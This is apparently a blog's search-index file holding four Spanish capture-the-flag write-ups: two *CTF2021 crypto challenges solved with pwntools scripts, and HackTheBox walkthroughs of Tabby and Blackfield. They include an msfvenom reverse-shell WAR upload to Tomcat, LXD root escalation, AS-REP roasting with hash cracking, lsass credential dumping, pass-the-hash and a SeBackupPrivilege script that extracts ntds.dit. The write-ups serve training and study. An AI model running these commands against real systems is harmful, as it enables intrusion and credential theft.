<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>GuessKey2</title>
      <link href="2021/01/16/GuessKey2/"/>
      <url>2021/01/16/GuessKey2/</url>
      
        <content type="html"><![CDATA[<p><strong>Autor: TonyTowers</strong><br><code>*CTF2021</code></p><blockquote><p>No hay descripción del desafío, solamente nos adjuntan un zip.</p></blockquote><hr><h1 id="Analizar-el-codigo"><a href="#Analizar-el-codigo" class="headerlink" title="Analizar el código"></a>Analizar el código</h1><p>El primer paso es analizar el código del archivo que nos adjuntan en el zip:</p><p><strong>GuessKey.py</strong></p><pre><code class="python">from random import randintimport osfrom flag import flagN=64key=randint(0,2**N)# print keykey=bin(key)[2:].rjust(N,&#39;0&#39;)count=0while True:        p=0        q=0        new_key=&#39;&#39;        zeros=[0]        for j in range(len(key)):                if key[j]==&#39;0&#39;:                        zeros.append(j)        p=zeros[randint(0,len(zeros))-1]        q=zeros[randint(0,len(zeros))-1]        try:                mask=int(raw_input(&quot;mask:&quot;))        except:                exit(0)        mask=bin(mask)[2:]        if p&gt;q:                tmp=q                q=p                p=tmp        cnt=0        for j in range(0,N):        for j in range(0,N):                if j in range(p,q+1):                        new_key+=str(int(mask[cnt])^int(key[j]))                else:                        new_key+=key[j]                cnt+=1                cnt%=len(mask)        key=new_key        try:                guess=int(raw_input(&quot;guess:&quot;))        except:                exit(0)        if guess==int(key,2):                count+=1                print &#39;Nice.&#39;        else:                count=0                print &#39;Oops.&#39;        if count&gt;2:        print flag</code></pre><p>El código es igual que el del desafío <a href="../../../../2021/01/16/GuessKey/">GuessKey</a>, la única diferencia esque esta vez no se imprime el valor de la variable key.</p><h1 id="Elaborar-el-exploit"><a href="#Elaborar-el-exploit" class="headerlink" title="Elaborar el exploit"></a>Elaborar el exploit</h1><p>Esta vez no vale con elegir 0 de máscara e introducir la clave 3 veces seguidas porque no conocemos la clave. El truco está en dos puntos: la clave key no se reestablece tras cada modificación y la variable “q” en algún momento tomará el valor de la posición del 0 menos significativo en la clave “key” en binario. Sabiendo esto, podemos hacer un xor con 1 contínuamente, dejando a 1 todos los 0 de la clave, desde el menos significativo hasta el más significativo (de derecha a izquierda). Sabremos que ya hemos dejado toda la clave a 1 cuando al establecer el valor de “guess” a “2^64 - 1” el servidor nos responda con “Nice.” en vez de “Oops.”, en este punto solo tendremos que enviar 0 como máscara y el valor anterior como “guess” y ya obtendremos la flag: </p><p><strong>exploit.py</strong></p><pre><code class="python">#!/usr/bin/python3from pwn import *#p = process(&quot;./GuessKey_Fix.py&quot;)p = remote(&quot;52.163.228.53&quot;, 8082)while True:    p.recvuntil(&quot;mask:&quot;)    p.send(&quot;1\n&quot;)    p.recvuntil(&quot;guess:&quot;)    p.send(&quot;18446744073709551615\n&quot;)    check=p.recvuntil(&quot;.&quot;)    print(check)    if(check==b&#39;Nice.&#39;):        p.recvuntil(&quot;mask:&quot;)        p.send(&quot;0\n&quot;)        p.recvuntil(&quot;guess:&quot;)        p.send(&quot;18446744073709551615\n&quot;)        p.recvuntil(&quot;mask:&quot;)        p.send(&quot;0\n&quot;)        p.recvuntil(&quot;guess:&quot;)        p.send(&quot;18446744073709551615\n&quot;)        p.recvuntil(&quot;Nice.\n&quot;)        print(p.recvuntil(&quot;&#125;&quot;))        p.close()        exit(0)</code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xor </tag>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GuessKey</title>
      <link href="2021/01/16/GuessKey1/"/>
      <url>2021/01/16/GuessKey1/</url>
      
        <content type="html"><![CDATA[<p><strong>Autor: TonyTowers</strong><br><code>*CTF2021</code></p><blockquote><p>No hay descripción del desafío, solamente nos adjuntan un zip.</p></blockquote><hr><h1 id="Analizar-el-codigo"><a href="#Analizar-el-codigo" class="headerlink" title="Analizar el código"></a>Analizar el código</h1><p>El primer paso es analizar el código del archivo que nos adjuntan en el zip:</p><p><strong>GuessKey.py</strong></p><pre><code class="python">from random import randintimport osfrom flag import flagN=64key=randint(0,2**N)print keykey=bin(key)[2:].rjust(N,&#39;0&#39;)count=0while True:        p=0        q=0        new_key=&#39;&#39;        zeros=[0]        for j in range(len(key)):                if key[j]==&#39;0&#39;:                        zeros.append(j)        p=zeros[randint(0,len(zeros))-1]        q=zeros[randint(0,len(zeros))-1]        try:                mask=int(raw_input(&quot;mask:&quot;))        except:                exit(0)        mask=bin(mask)[2:]        if p&gt;q:                tmp=q                q=p                p=tmp        cnt=0        for j in range(0,N):        for j in range(0,N):                if j in range(p,q+1):                        new_key+=str(int(mask[cnt])^int(key[j]))                else:                        new_key+=key[j]                cnt+=1                cnt%=len(mask)        key=new_key        try:                guess=int(raw_input(&quot;guess:&quot;))        except:                exit(0)        if guess==int(key,2):                count+=1                print &#39;Nice.&#39;        else:                count=0                print &#39;Oops.&#39;        if count&gt;2:        print flag</code></pre><p>Primero se genera una cave aleatoria “key” de 64 bits y se imprime por pantalla. Después se crea un array llamado “zeros” en el que se añaden las posiciones de los 0 en la clave “key” expresada en binario y se guardarán dos elementos aleatorios de “zeros” en las variables “p” y “q”. Se espera por STDIN un número que se guarda en la variable “mask”. Lo siguiente es asegurarse de que “p” es menor que “q” para poder hacer un bucle desde “p” hasta “q” para variar los bits de la clave “key” dentro de este rango (p-q), la modificación consiste en hacer un XOR con la variable “mask”. Por último se espera otro número por STDIN que se guardará en “guess”, para obtener la flag, “guess” ha de ser igual a “key” tres veces seguidas.</p><h1 id="Elaborar-el-exploit"><a href="#Elaborar-el-exploit" class="headerlink" title="Elaborar el exploit"></a>Elaborar el exploit</h1><p>El problema es que no conocemos el rango de la clave que será modificado, pero como podemos elegir la máscara con la que se hará el XOR, si hacemos que esa máscara sea 0, no habremos modificado ningún bit de la clave entonces “guess == key”. El exploit sería así:</p><p><strong>exploit.py</strong></p><pre><code class="python">#!/usr/bin/python3from pwn import *#p = process(&quot;./GuessKey.py&quot;)p = remote(&quot;52.163.228.53&quot;, 8080)# Guardar el valor de &quot;key&quot;key = p.recvuntil(&quot;\n&quot;)# Repetir el procedimiento 3 vecesfor i in range(3):    # Enviar un 0 cuando se pida la variable &quot;mask&quot;    p.recvuntil(&quot;mask:&quot;)    p.send(&quot;0\n&quot;)    # Enviar la clave &quot;key&quot; cuando se pida la variable &quot;guess&quot;    p.recvuntil(&quot;guess:&quot;)    p.send(key)# Imprimir la flagp.recvuntil(&quot;Nice.\n&quot;)print(p.recvuntil(&quot;&#125;&quot;))p.close()exit(0)</code></pre><p>Enlace del siguiente reto ==&gt; <a href="../../../../2021/01/16/GuessKey2/">GuessKey2</a></p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xor </tag>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabby - HTB</title>
      <link href="2020/06/29/Tabby/"/>
      <url>2020/06/29/Tabby/</url>
      
        <content type="html"><![CDATA[<p><strong>Autor: J4ck21</strong><br><code>HackTheBox</code></p><blockquote><p>OS:     Linux<br>  Dificultad:     Easy<br>  Puntos:     20</p></blockquote><p>Nmap scan</p><pre><code class="bash">nmap -p- --open -v -n tabby.htb</code></pre><blockquote><p>PORT     STATE SERVICE<strong>2</strong><br>22/tcp   open  ssh<br>80/tcp   open  http<br>8080/tcp open  http-proxy</p></blockquote><pre><code class="bash">nmap -p22,80,8080 -sC -sV -o allPorts tabby.htb</code></pre><blockquote><p>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Mega Hosting<br>8080/tcp open  http    Apache Tomcat<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-title: Apache Tomcat</p></blockquote><h1 id="Puerto-80"><a href="#Puerto-80" class="headerlink" title="Puerto 80"></a>Puerto 80</h1><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>Vemos que en apartado de news es muy distinto a los otros del menu ya que en este te envia a un fichero que sellama statment, esto significa que hay alta probabilidad de LFI. </p><p><img src="https://i.imgur.com/89K4sdB.png"></p><p>Añadimos megahosting.htb en /etc/hosts para ver el contenido. Miramos con Burp y vemos que realmente se trata de un LFI. </p><p><img src="https://i.imgur.com/vc0fNsc.png"></p><p>Guardamos los usuarios como informacion importante asi que vamos a filtrar los que puedan loguearse, normalmente son los que acaban con /bin/bash peró eliminare los que no quiera asi el filtro sera mejor. </p><pre><code class="bash">cat etc-passwd | grep -v &quot;nologin$\|false$\|sync$&quot;</code></pre><blockquote><p>root:x:0:0:root:/root:/bin/bash<br>ash:x:1000:1000:clive:/home/ash:/bin/bash</p></blockquote><h1 id="Puerto-8080"><a href="#Puerto-8080" class="headerlink" title="Puerto 8080"></a>Puerto 8080</h1><p>Nos dirigimos a la pagina tomcat por el puerto 8080 y si leemos un poco vemos que hay dos cosas importantes, un fichero con users y hay distina informacion a tener en cuenta en este caso vemos que se trata de que el creador de la web és veterano y lo instala en CATALINA_HOME. </p><p><img src="https://i.imgur.com/p7GIRAJ.png"></p><p>Aun asi el directorio no es correcto asi que utilizamos la herrramienta ffuf para descubrirlo. </p><pre><code class="bash">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://megahosting.htb/news.php\?file\=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml -fc 404,401 -fs 0</code></pre><blockquote><pre><code>   /&#39;___\  /&#39;___\           /&#39;___\  /\ \__/ /\ \__/  __  __  /\ \__/  \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\   \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/    \ \_\   \ \_\  \ \____/  \ \_\     \/_/    \/_/   \/___/    \/_/  v1.0.2</code></pre><hr><p>:: Method           : GET<br> :: URL              : <a href="http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml">http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml</a><br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200,204,301,302,307,401,403<br> :: Filter           : Response status: 404,401<br> :: Filter           : Response size: 0</p><hr></blockquote><blockquote><p>etc                     [Status: 200, Size: 2325, Words: 361, Lines: 48]</p></blockquote><p>Encontramos el xml, vemos el user y una password de tomcat.</p><pre><code class="html">&lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt;</code></pre><p><img src="https://i.imgur.com/7qWZfMH.png"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>Creación del payload con metasploit con extension war.</p><pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></pre><p>Subir el war file, lo hacemos con curl porque no tenemos permisos de la interfaz html para ello necessitariamos ser tambien ==manager-gui==, pero al ser ==manager-script== nos permite la subida de ficheros war. </p><pre><code class="bash">curl -u tomcat:&#39;$3cureP4s5w0rd123!&#39; -T shell.war &#39;http://tabby.htb:8080/manager/text/deploy?path=/shell&amp;update=true&#39;</code></pre><blockquote><p>OK - Deployed application at context path [/shell]</p></blockquote><p>Vemos que podemos comprovar si el fichero se ha subido correctamente como dice en la web de la siguiente forma.</p><pre><code class="bash">curl -u tomcat:&#39;$3cureP4s5w0rd123!&#39; http://tabby.htb:8080/manager/text/list</code></pre><p><img src="https://i.imgur.com/G4IxakX.png"></p><p>Ejecucion de la shell</p><pre><code class="bash">curl -u tomcat:&#39;$3cureP4s5w0rd123!&#39; http://tabby.htb:8080/shell/</code></pre><h1 id="Usuario-ASH"><a href="#Usuario-ASH" class="headerlink" title="Usuario - ASH"></a>Usuario - ASH</h1><p>Vemos un arvhivo backup en <em>/var/www/html/files</em></p><h2 id="Craquear-el-zip"><a href="#Craquear-el-zip" class="headerlink" title="Craquear el zip"></a>Craquear el zip</h2><pre><code class="bash">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip</code></pre><blockquote><p>PASSWORD FOUND!!!!: pw == admin@it</p></blockquote><p>Probamos de loguearnos con la password para el user. Y nos devuelve la shell. </p><p><img src="https://i.imgur.com/Rgn3QHl.png"></p><h1 id="Escalacion-de-Privilegios-ROOT"><a href="#Escalacion-de-Privilegios-ROOT" class="headerlink" title="Escalación de Privilegios - ROOT"></a>Escalación de Privilegios - ROOT</h1><p>Si vemos dentro del directiorio snap vemos un programa donde logicamente tenemos estamos dentro del grupo.</p><p><img src="https://i.imgur.com/YJwLNBi.png"></p><p>Vemos que hay una possible escalacion por ese programa. Ya que cualquier miembro local que pertenezca en este grupo puede immediatamente escalar privilegios hacia al user root. </p><h2 id="Preparacion-de-la-escalacion-de-privilegios"><a href="#Preparacion-de-la-escalacion-de-privilegios" class="headerlink" title="Preparación de la escalación de privilegios"></a>Preparación de la escalación de privilegios</h2><p>El primer passo es descargarse el build alpine. Para ejecutarlo en la maquina atacante, para ello tenemos que hacerlo con nuestro root user. Y luego transferir este archivo tar que se nos ha creado a la maquina victima. </p><pre><code class="bash">git clone https://github.com/saghul/lxd-alpine-builder.gitcd lxd-alpine-buildersudo ./build-alpine</code></pre><p><img src="https://i.imgur.com/IzB4VBa.png"></p><p>Ahora toca transferir nuestro fichero al directiorio home del usuario, és importante que sea en el home ya que sino no encuentra el tar. </p><p><img src="https://i.imgur.com/9WWvoOP.png"></p><p>El siguiente paso es crear la imagen con el LXD. </p><p><img src="https://i.imgur.com/2T7L7NI.png"></p><p>És importante leer porque nos dice que como és la primera vez que lo ejecutamos nos pide que antes utilizemos lxd init para crear la pool y asi no tener errores al crear el container. </p><p>Dejamos todo por defecto y al final listamos las imagenes. </p><p><img src="https://i.imgur.com/jPU8ebq.png"></p><p>Por ultimo, queda crear el container y ejecutarlo como root. </p><pre><code class="bash">lxc init ShadowImage ShadowDC -c security.privileged=truelxc config device add ShadowDC mydevice disk source=/ path=/mnt/root recursive=truelxc start ShadowDClxc exec ShadowDC /bin/shid</code></pre><p>Comprovación en la maquina victima. </p><p><img src="https://i.imgur.com/A65CTHw.png"></p><p>Y la flag la encontramos en la ubicacion <em>/mnt/root/root/root.txt</em></p><h1 id="Obteneindo-accesso-por-ssh"><a href="#Obteneindo-accesso-por-ssh" class="headerlink" title="Obteneindo accesso por ssh"></a>Obteneindo accesso por ssh</h1><p>Vemos que hay el puerto ssh asi que añadiremos una llave autorizada para poder acceder como root. Los passos son los siguientes:</p><p><img src="https://i.imgur.com/xdC94Bv.png"></p><p>Lo pegamos en la maquina victima.</p><p><img src="https://i.imgur.com/3ItWxfY.png"></p><p>Y ya tenemos shell por ssh. </p><p><img src="https://i.imgur.com/nBjl17D.png"></p><p>Enlaces: </p><p>LFI - <a href="https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601">https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601</a></p><p>Creación del payload war - <a href="https://netsec.ws/?p=331">https://netsec.ws/?p=331</a></p><p>Tomcat listar los ficheros subidos - <a href="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#List_Currently_Deployed_Applications">https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#List_Currently_Deployed_Applications</a></p><p>Fcrackzip - <a href="https://pentaroot.com/cracking-encrypted-zip-fcrackzip/">https://pentaroot.com/cracking-encrypted-zip-fcrackzip/</a></p><p>lxd PrivEsc - <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p><p>Creación de llaves SSH - <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2">https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ffuf </tag>
            
            <tag> HTB </tag>
            
            <tag> Linux </tag>
            
            <tag> API Tomcat </tag>
            
            <tag> LFI </tag>
            
            <tag> fcraczip </tag>
            
            <tag> lxd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blackfiel - HTB</title>
      <link href="2020/06/26/Blackfield/"/>
      <url>2020/06/26/Blackfield/</url>
      
        <content type="html"><![CDATA[<p><strong>Autor: J4ck21</strong><br><code>HackTheBox</code></p><blockquote><p>Nombre: Blackfield<br>  Dificultad: Hard<br>  OS: Windows<br>  Puntos: 40</p></blockquote><h1 id="Enumeracion"><a href="#Enumeracion" class="headerlink" title="Enumeración"></a>Enumeración</h1><p>Enumeración de puertos </p><pre><code class="bash">nmap -p- --open -v -n -T5 -Pn 10.10.10.102</code></pre><p>Enumeracion con el script por defecto con los puertos obtenidos del escaneo anterior.</p><pre><code class="bash">nmap -sC -sV -p53,445,135,5985,88,389,3268 -oN allports -Pn blackfield.htb</code></pre><blockquote><p>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain?<br>| fingerprint-strings:<br>|   DNSVersionBindReqTCP:<br>|     version<br>|_    bind<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-20 22:32:15Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br>SF-Port53-TCP:V=7.80%I=7%D=6/20%Time=5EEE2BD1%P=x86_64-pc-linux-gnu%r(DNSV<br>SF:ersionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version<br>SF:x04bind\0\0\x10\0\x03”);<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</p></blockquote><blockquote><p>Host script results:<br>|<em>clock-skew: 7h00m49s<br>| smb2-security-mode:<br>|   2.02:<br>|</em>    Message signing enabled and required<br>| smb2-time:<br>|   date: 2020-06-20T22:34:36<br>|_  start_date: N/A</p></blockquote><p>Vemos que hay el puerto 445 abierto, hacemos un null session para listar los directiorios y obtenemos la siguiente respuesta:</p><pre><code>smbclient -L //10.10.10.192 -N_</code></pre><blockquote><pre><code>   Sharename       Type      Comment  ---------       ----      -------   ADMIN$          Disk      Remote Admin   C$              Disk      Default share   forensic        Disk      Forensic / Audit share.   IPC$            IPC       Remote IPC   NETLOGON        Disk      Logon server share   profiles$       Disk   SYSVOL          Disk      Logon server share</code></pre></blockquote><p>El siguiente passo és enumerar esos directorios para hacerlo utilizaremos ==smbclient \\&lt;IP<I>&gt;\&lt;Directorio<D>&gt; -N==</p><p>Peró queremos automatizarlo por no ir uno a uno para ello creamos el siguiente script en bash muy basico. </p><p>Una vez listado los directorios creamos un pequeño script para guardarlos en un fixero. </p><pre><code class="bash">smbclient -L //10.10.10.192/ -N &gt; f.txt &amp;&amp; cat f.txt | awk &#39;&#123;print $1&#125;&#39; | tail -n +4 &gt; folders.txt &amp;&amp; rm f.txt</code></pre><p>Y vemos y listamos todos los que tenemos permisos. </p><pre><code class="bash">for fol in $(cat folders.txt); do echo -n &quot;Try: $fol - \n&quot;; smbclient //10.10.10.192/$fol -c dir -N;done</code></pre><p>Vemos una larga lista de los usuarios asi que lo guardamos en un documento para hacer fuerza bruta y enumerar. </p><pre><code class="bash">smbclient //10.10.10.192/profiles$ -N -c dir &gt; tempusers.txt; cat tempusers.txt | awk &#39;&#123;print $1&#125;&#39; &gt; users.txt; rm tempusers.txt</code></pre><p>Ahora con un bucle for probamos haber los usuarios que existen y si alguno se puede loguear con null session.</p><pre><code class="bash">#!/bin/bashfor user in $(cat users.txt); do    msn=$(rpcclient 10.10.10.192 -U $user -N | tail -1)    if [[ $(echo &quot;$msn&quot; | grep -v &quot;ACCESS_DENIED&quot;) ]]; then            echo &quot;User exist: $user&quot;    fidone</code></pre><p>El output és el siguiente, vemos que ninguno de ellos és possible tener una session nula.</p><blockquote><p><em>User exist: audit2020</em><br><em>User exist: support</em><br><em>User exist: svc_backup</em></p></blockquote><h1 id="USER-1-support"><a href="#USER-1-support" class="headerlink" title="USER 1 : support"></a>USER 1 : support</h1><p>Los metemos en un fichero, que se llamara users.txt.<br>Utilizaremos el script GetNPUser.py_, para lograr los tickets de kerberos que no necessita preautentificación. <a href="https://www.hackingarticles.in/abusing-kerberos-using-impacket/"> Clica para más información </a></p><pre><code class="bash">GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -request -dc-ip 10.10.10.192</code></pre><pre><code>$krb5asrep$23$support@BLACKFIELD.LOCAL:f72434fff2bed49682c2566af5b92e1d$62bd6347ae54e6f0172703c53c383b0afed413e3396f6b79d1315e58f8817f04e316ca720cdb6faf15e4049fa822fb5d5c0069d1db841a30fb0bb7bfb599f5f88ee0305eb3ef87e8121a18def9e4e5a3756e9d39a76978dfee3127ef40684b646e28eea5bd7ed0a6180ac3572a97650c8ed499275b27785e437d7e81679fb6582e4c7212497509eb59fe67088cea8414131a885449928aca9ae9a780e51a8acb96993311ee0d042a47ac5e3f29b24044adff29f6dbeb5b2bea6e3a7b65b4c034e4fa99f0bfc85bf9c60758997522d7f50abf5edab22778bafb2d27439fa2897280460cf2b7aee9b7738a2bf2d094b054f9aaf039</code></pre><p>Guardamos este output en un archivo llamado support.hash y con hashcat procedemos a lograr la contraseña de kerbereos. <a href="https://github.com/frizb/Hashcat-Cheatsheet#cracking-hashes-from-kerboroasting---krb5tgs">Hashcat Cheat sheet</a></p><pre><code class="bash">hashcat -m 18200 -a 0 -w 3 support.hash /usr/share/wordlists/rockyou.txt --force</code></pre><p>Obtenemos la siguiente respuesta<br><code>#00^BlackKnight</code></p><h1 id="USER-2-audit2020"><a href="#USER-2-audit2020" class="headerlink" title="USER 2 : audit2020"></a>USER 2 : audit2020</h1><p>Vemos que tenemos acceso desde rpcclient y los permisos que tenemos como usuario nos permite cambiar la password RPC del user audit2020, primero introduciendo la nueva contraseña del usuario y luego la del usuario support. </p><p><img src="https://i.imgur.com/RsFzDEt.png"></p><h1 id="USER-3-svc-backup"><a href="#USER-3-svc-backup" class="headerlink" title="USER 3 : svc_backup"></a>USER 3 : svc_backup</h1><p>Ahora tenemos de nuevo accesos a mas directiorios del samba concretamente al forensics.</p><pre><code class="bash">smbclient \\\\10.10.10.192\\forensic --user=audit2020%Test1234 -c &#39;prompt OFF;recurse ON; cd memory_analysis; mget *&#39;</code></pre><p>Vemos que hay un zip que se llama lssa descomprimimos y podemos ver credenciales dentro. Con lo siguiente: </p><pre><code class="bash">pypykatz lsa minidump lsass.DMP</code></pre><p>Como información importante e interesante encontramos esto. </p><blockquote><p>== MSV ==<br>        Username: svc_backup<br>        Domain: BLACKFIELD<br>        LM: NA<br>        NT: 9658d1d1dcd9250115e2205d9f48400d<br>        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</p></blockquote><p>Vemos directamente que és possible loguearnos haciendo un pass de hash en evil-winrm </p><p><img src="https://i.imgur.com/UBkhp59.png"></p><h1 id="Escalacion-de-privilegios-Administrator"><a href="#Escalacion-de-privilegios-Administrator" class="headerlink" title="Escalación de privilegios : Administrator"></a>Escalación de privilegios : Administrator</h1><p>Hacemos la enumeración basica para escalación de privilegios.</p><p>Iniciamos con un ==whoami /all== y vemos información interesante en los privilegios. </p><p><img src="https://i.imgur.com/Oz4ITL8.png"></p><h2 id="Preparacion-del-exploit"><a href="#Preparacion-del-exploit" class="headerlink" title="Preparación del exploit"></a>Preparación del exploit</h2><p>Buscamos como extraer el archivo NTDS.dit y el registro del sistema ya que nuestro usuario tiene permisos de backup.<br>El script que usamos es necessario <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">DiskShadow</a> para copiar y extraer información al volumen Shadow.</p><p>Para abusar de este script primero es necessario tener descargado estos dos dll que los encontramos en el repositorio <em><a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></em></p><p>A mi personalmente me gusta crear un directiorio temporal para ser el menos visible y asi és mucho más fàcil trabajar desde allí.</p><p>Subimos los archivos en ese directorio. </p><p><img src="https://i.imgur.com/Ww2qr7Y.png"></p><p>Y ahora nos descargamos el siguiente script automatizado para lograr la escalación de privilegios. <a href="https://raw.githubusercontent.com/return-z/SeBackupPrivilege-Abuse/master/SeBackupPrivAbuse.ps1">SeBackupPrivAbuse.ps1</a></p><pre><code class="powershell">#PS Script to use the SeBackupPrivilege for extracting the ntds.dit file and reg system file#Purely for educational purposes. Illegal purposes are not intended.#Not completely my ideas. Taken from a few sources and put together in one place.$current_path = Get-Location#Uncomment the lines below if https connenction is allowed or working, otherwise download the dlls and save on the machine#Invoke-WebRequest -Uri &quot;https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll&quot; -OutFile &quot;SeBackupPrivilegeUtils.dll&quot;#Invoke-WebRequest -Uri &quot;https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll&quot; -OutFile &quot;SeBackupPrivilegeCmdLets.dll&quot;Import-Module .\SeBackupPrivilegeUtils.dllImport-Module .\SeBackupPrivilegeCmdLets.dllSet-SeBackupPrivilege#set ACL in the windows folder$path = &quot;C:\windows\&quot;$user = &quot;DOMAIN\USER&quot;     #EDIT THIS LINE BEFORE USAGE$acl = get-acl -Path $path$acl_rule = $user,&#39;FullControl&#39;,&#39;ContainerInherit,ObjectInherit&#39;,&#39;None&#39;,&#39;Allow&#39;$access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule $acl_rule$acl.AddAccessRule($access_rule)Set-Acl -Path $path -AclObject $acl#Creating a script file for DiskShadow&quot;set metadata C:\windows\temp\metadata.cab&quot; | Out-File script.txt -encoding ascii&quot;set context persistent nowriters&quot; | Out-File script.txt -encoding ascii -append&quot;begin backup&quot; | Out-File script.txt -encoding ascii -append&quot;add volume c: alias mydrive&quot; | Out-File script.txt -encoding ascii -append&quot;create&quot; | Out-File script.txt -encoding ascii -append&quot;expose %mydrive% k:&quot; | Out-File script.txt -encoding ascii -append#Using DiskShadow to get create a Volume Shadow Copycd /windows/system32cmd /c &quot;diskshadow.exe /s $current_path\\script.txt&quot;Copy-FileSeBackupPrivilege k:\windows\ntds\ntds.dit $current_path\\ntds.dit -Overwritecd $current_pathdel script.txt#Cleanup &quot;delete shadows exposed k:&quot; | Out-File script.txt -encoding ascii -append&quot;exit&quot; | Out-File script.txt -encoding ascii -appendcd /windows/system32cmd /c &quot;diskshadow.exe /s $current_path\\script.txt&quot;cd $current_pathdel script.txt#Get the system registry hivecmd /c &quot;reg.exe save hklm\system .\system.bak&quot;</code></pre><p>Ahora obtendremos los dos ficheros, los descargamos para poder<br>obtener el hash Administrador, utilizando SecretsDump.py_.</p><p><img src="https://i.imgur.com/bz5s05Q.png"></p><p>Accedemos al user Administrator y obtenemos la flag del root.</p><p><img src="https://i.imgur.com/bqzx0ig.png"><br></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
          <category> Active Directory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> HTB </tag>
            
            <tag> Active Directory </tag>
            
            <tag> kerberos </tag>
            
            <tag> hashcat </tag>
            
            <tag> rpcclient </tag>
            
            <tag> disckshadow </tag>
            
            <tag> evil-winrm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
